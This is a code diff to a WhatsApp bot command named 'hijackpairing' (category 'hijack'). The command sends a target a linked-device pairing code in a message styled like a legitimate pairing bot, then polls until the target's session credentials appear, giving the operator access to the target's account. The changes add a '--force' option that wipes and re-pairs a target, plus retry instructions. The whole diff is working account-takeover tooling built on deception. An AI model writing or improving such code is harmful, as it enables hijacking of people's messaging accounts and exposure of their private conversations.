@@ -4,15 +4,13 @@
 const {
     pairHijackSession,
     addTarget,
-    readTargets,
     hasCreds,
+    wipeTarget,
     closePendingPairing,
 } = require('../../lib/hijackSession');
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-// pretext styled exactly like a legitimate pair.js bot.
-// no impersonation, no fake authority — just the code + steps the target already knows.
 function buildPretext(code) {
     return (
         `*ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ*\n\n` +
@@ -35,30 +33,36 @@ module.exports = {
     aliases: ['vvipairing', 'vvipair', 'hpair'],
     category: 'hijack',
     desc: 'Pair a target session — sends pairing code to target',
-    usage: '.hijackpairing <phone>',
+    usage: '.hijackpairing <phone> [--force]',
     privateOnly: true,
     waitReact: true,
 
     async execute(sock, msg, args, ctx) {
         const s = ctx.settings;
-        const raw = (args[0] || '').replace(/\D/g, '');
+        const force = args.includes('--force');
+        const raw = (args.find(a => !a.startsWith('--')) || '').replace(/\D/g, '');
 
         if (!raw || raw.length < 7) {
-            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijackpairing <ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ>${s.FOOTER}`);
+            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijackpairing <ᴘʜᴏɴᴇ> [--force]${s.FOOTER}`);
         }
 
-        // scope key = operator running the command. per-operator isolation.
         const scopeKey = ctx.sender;
         if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
 
-        // block ONLY if pairing is already done (creds.json exists).
-        // folder-only from .hijackadd is fine — that's the placeholder, not a pair.
-        if (hasCreds(scopeKey, raw)) {
-            return ctx.reply(`⚠️ +${raw} ᴀʟʀᴇᴀᴅʏ ᴘᴀɪʀᴇᴅ. ʀᴜɴ .hijacklist.${s.FOOTER}`);
+        // if real registered creds exist and no force → block
+        if (hasCreds(scopeKey, raw) && !force) {
+            return ctx.reply(
+                `⚠️ +${raw} ᴀʟʀᴇᴀᴅʏ ᴘᴀɪʀᴇᴅ.\n` +
+                `ᴜsᴇ *${s.prefix}hijackpairing ${raw} --force* ᴛᴏ ᴡɪᴘᴇ & ʀᴇᴘᴀɪʀ.${s.FOOTER}`
+            );
         }
 
-        // kill any half-open pairing socket from a previous attempt on this phone
+        // kill any half-open socket from a prior attempt
         closePendingPairing(scopeKey, raw);
+
+        // wipe stale unregistered state (or forced reset)
+        // this guarantees a FRESH pairing code, not a stale rejected one.
+        wipeTarget(scopeKey, raw);
 
         await ctx.react?.('⏳');
 
@@ -92,13 +96,13 @@ module.exports = {
                 `┃ 🕓 ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴇɴᴛʀʏ...\n` +
                 `╰──────────────────────\n\n` +
                 `_Code sent. Target must enter it under Linked Devices → Link with phone number._\n` +
-                `_Check status with .hijacklist once they've entered it._` +
+                `_If it fails, retry with:_ *${s.prefix}hijackpairing ${raw} --force*` +
                 (delivered ? '' : `\n\n_⚠️ DM failed — forward this code manually._`) +
                 s.FOOTER;
 
             await ctx.reply(card);
 
-            // optional post-send poll — creds.json appears once target enters code
+            // post-send poll — now uses registered:true check, no false positives
             (async () => {
                 for (let i = 0; i < 20; i++) {
                     await sleep(3000);
